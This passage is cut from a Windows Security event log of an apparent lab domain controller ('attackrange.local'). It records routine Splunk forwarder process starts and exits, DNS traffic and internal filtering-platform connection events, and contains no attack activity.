	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-MonitorNoHandle.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382416
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61349
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:07 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382415
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x10a4
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-netmon.exe
	Exit Status:	0x1
03/01/2021 10:55:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382420
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x11f0
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Exit Status:	0x1
03/01/2021 10:55:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382419
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x11f0
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382418
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55154
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:09 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382417
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55154
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:10 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382421
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59863
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382426
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60498
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382425
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		50076
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382424
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		50076
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382423
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		50076
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:11 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382422
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		50076
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382431
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1198
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382430
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		50076
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382429
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		50076
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382428
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1ec0
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Exit Status:	0x1
03/01/2021 10:55:12 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382427
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1ec0
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-powershell.exe" --ps2

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382434
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1d0c
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe
	Exit Status:	0x1
03/01/2021 10:55:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4688
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Creation
OpCode=Info
RecordNumber=1382433
Keywords=Audit Success
Message=A new process has been created.

Creator Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Target Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Process Information:
	New Process ID:		0x1d0c
	New Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe
	Token Elevation Type:	%%1936
	Mandatory Label:		Mandatory Label\System Mandatory Level
	Creator Process ID:	0x1954
	Creator Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
	Process Command Line:	"C:\Program Files\SplunkUniversalForwarder\bin\splunk-winprintmon.exe"

Token Elevation Type indicates the type of token that was assigned to the new process in accordance with User Account Control policy.

Type 1 is a full token with no privileges removed or groups disabled.  A full token is only used if User Account Control is disabled or if the user is the built-in Administrator account or a service account.

Type 2 is an elevated token with no privileges removed or groups disabled.  An elevated token is used when User Account Control is enabled and the user chooses to start the program using Run as administrator.  An elevated token is also used when an application is configured to always require administrative privilege or to always require maximum privilege, and the user is a member of the Administrators group.

Type 3 is a limited token with administrative privileges removed and administrative groups disabled.  The limited token is used when User Account Control is enabled, the application does not require administrative privilege, and the user does not choose to start the program using Run as administrator.
03/01/2021 10:55:13 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4689
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Process Termination
OpCode=Info
RecordNumber=1382432
Keywords=Audit Success
Message=A process has exited.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x3E7

Process Information:
	Process ID:	0x1198
	Process Name:	C:\Program Files\SplunkUniversalForwarder\bin\splunk-regmon.exe
	Exit Status:	0x1
03/01/2021 10:55:14 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382436
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55155
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:14 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382435
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55155
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382441
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60308
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382440
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382439
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382438
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:15 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382437
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60637
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:17 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382442
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:19 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382445
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60579
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:19 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382444
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55156
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:19 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382443
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55156
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382448
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55157
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382447
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55157
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:24 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382446
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60474
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382457
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60355
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382456
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55691
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382455
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55691
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382454
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		55691
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382453
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		55691
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:55:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382452
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60397
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
